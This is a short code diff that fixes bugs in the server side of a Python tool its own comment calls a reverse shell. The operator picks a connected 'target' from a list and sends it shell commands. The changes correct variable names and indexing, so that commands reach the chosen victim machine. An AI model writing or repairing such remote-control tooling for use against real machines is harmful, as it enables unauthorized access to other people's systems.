@@ -60,7 +60,7 @@ def accept_connections() :
     del connections_list
     del address_list
     connections_list = list()
-    adddress_list = list()
+    address_list = list()
 
     while True :
         conn, addr = objSocket.accept()
@@ -87,10 +87,7 @@ def shell_to_target(conn) :
         else :
             send(conn, cmd)
             data_back = conn.recv(4049)
-
-            while len(data_back) > 0: 
-                print(data_back.decode())
-                data_back = conn.recv(4049)
+            print(data_back.decode())
 
 """ Start the reverse shell """
 def start_shell() :
@@ -120,10 +117,10 @@ def start_shell() :
             if int(n) > len(connections_list) :
                 print('[!] Target doesn\'t exist.')
             else : 
-                target = connections_list[n - 1]
-                addr = address_list[n - 1]
+                target = connections_list[int(n) - 1]
+                addr = address_list[int(n) - 1]
                 print(f'Connection to {addr}')
-                shell_to_target(conn)
+                shell_to_target(target)
                 
 
         elif choise == 'q':
